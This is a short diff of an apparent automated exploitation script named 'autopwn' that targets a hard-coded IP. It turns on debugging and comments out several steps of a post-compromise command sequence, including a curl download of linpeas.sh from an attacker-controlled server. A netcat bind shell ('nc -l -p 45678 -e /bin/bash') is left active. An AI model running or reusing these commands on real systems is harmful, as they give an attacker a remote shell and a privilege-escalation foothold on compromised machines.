@@ -38,7 +38,7 @@ LOG("Launched autopwn.", logfile, "inf")
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
 
-debug = 0
+debug = 1
 
 
 def show_pwnguin():
@@ -381,12 +381,12 @@ if __name__ == "__main__":
 
     sequence = [
         "whoami",
-        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
+        #"curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
         "pwd",
-        "chown root:root linpeas.sh",
+        #"chown root:root linpeas.sh",
         "echo 0xcafedeadbeef",
-        "chmod +x linpeas.sh",
-        "echo matthislemechan",
+        #"chmod +x linpeas.sh",
+        #"echo matthislemechan",
         "nc -l -p 45678 -e /bin/bash",
     ]
     sequence2 = [
